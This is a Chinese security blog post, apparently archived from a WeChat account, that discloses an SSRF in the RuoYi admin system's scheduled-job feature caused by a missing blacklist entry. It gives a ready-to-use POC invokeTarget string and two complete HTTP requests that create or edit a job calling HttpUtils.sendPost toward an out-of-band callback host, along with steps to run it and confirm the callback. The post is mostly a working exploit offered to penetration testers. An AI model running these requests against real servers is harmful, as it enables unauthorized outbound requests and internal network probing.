---
source: "gelusus/wxvl 公众号漏洞文库"
---

#  SpringKill的0day|若依后台定时任务存在SSRF漏洞   
原创 春纱  卫界安全-阿呆攻防   2024-04-20 15:21  
  
这个漏洞适合广大水洞的安服兄弟们，这个洞是SpringKill为了支援呆哥在项目上有交付，现场翻源码审的，POC很简单附在文中。  
  
SpringKill师傅的Github地址：https://github.com/springkill  
  
sdfd  

				
				  
  
   
  
01  
  
项目介绍  
  

				
				  
  
- 项目名称：若依  
  
- 项目地址：  
```
https://gitee.com/y_project/RuoYi
```  
  
- 项目描述：基于SpringBoot的权限管理系统 易读易懂、界面简洁美观。核心技术采用Spring、MyBatis、Shiro没有任何其它重度依赖。直接运行即可用  
  
   
  
02  
  
简单分析  
  

				
				  
```
https://gitee.com/y_project/RuoYi/blob/master/ruoyi-common/src/main/java/com/ruoyi/common/constant/Constants.java
```  
  
这是若依黑名单位置：ruoyi-common/src/main/java/com/ruoyi/common/constant/Constants.java。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hFPkDXcMlMsZEcQz3fKRKuTYRsgeqJnBXHeTX8AD09L2yOy5UWagfnoiau7ic4TphsYLkXXJNv1r5uqkz6dDVA1Q/640?wx_fmt=png&from=appmsg&random=0.6949478832681126&random=0.26939201221393394 "")  
  
没加com.ruoyi.common的黑名单限制。  
  
  
03  
  
复现案例  
  

				
				  
  
 POC：  
```
com.ruoyi.common.utils.http.HttpUtils.sendPost('ftp://6a928e83f9.ipv6.1433.eu.org','')
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hFPkDXcMlMsZEcQz3fKRKuTYRsgeqJnB0lRsgvbibcymtlu53DFrrcJdXSFN6jcwhWINsyRp0XKXdfPD7K6W1pQ/640?wx_fmt=png&from=appmsg&random=0.9732152413003161 "")  
```
POST /monitor/job/edit HTTP/1.1
Host: xxx
Connection: keep-alive
Content-Length: 242
sec-ch-ua: "Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
Cookie: JSESSIONID=563ce678-53de-407f-8ed9-cabbc1f17ea4

jobId=102&updateBy=admin&jobName=test&jobGroup=DEFAULT&invokeTarget=com.ruoyi.common.utils.http.HttpUtils.sendPost('ftp%3A%2F%2F6a928e83f9.ipv6.1433.eu.org'%2C'')&cronExpression=0%2F10+*+*+*+*+%3F&misfirePolicy=1&concurrent=1&status=1&remark=
```  
```
POST /monitor/job/add HTTP/1.1
Host: xxxx
Connection: keep-alive
Content-Length: 232
sec-ch-ua: "Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
Cookie: JSESSIONID=563ce678-53de-407f-8ed9-cabbc1f17ea4


createBy=admin&jobName=test1&jobGroup=DEFAULT&invokeTarget=com.ruoyi.common.utils.http.HttpUtils.sendPost('ftp%3A%2F%2F6a928e83f9.ipv6.1433.eu.org'%2C'')&cronExpression=0%2F1+*+*+*+*+%3F&misfirePolicy=1&concurrent=1&status=0&remark=
```  
  
点击确认->更多操作->执行一次  
  
点完之后去dnslog那里看就行了，这里执行需要等待5-20秒。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hFPkDXcMlMsZEcQz3fKRKuTYRsgeqJnBH6uClxpKYnlLJ7J9RCDSNyImAYdIYicJHF4G9Akiawrx0ngcfgmZiacPA/640?wx_fmt=png&from=appmsg&random=0.6412688614656281 "")  
  
  
后面执行完毕之后在调度日志也可以看到。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hFPkDXcMlMsZEcQz3fKRKuTYRsgeqJnBHESLBYSHFeBuoT5WWk5U2HVqKKGjnV3VsIge4SzG3micWrV8zVIUUag/640?wx_fmt=png&from=appmsg&random=0.3613715179024466 "")  
  
   
  
04  
  
技术交流  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/hFPkDXcMlMsZEcQz3fKRKuTYRsgeqJnBZdaFQ2aslZz9AHFsdSJ3uMyZrROPicMvibICgKDZwHJwO3ATiaa0te3kQ/640?wx_fmt=jpeg "")  
  
  
  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
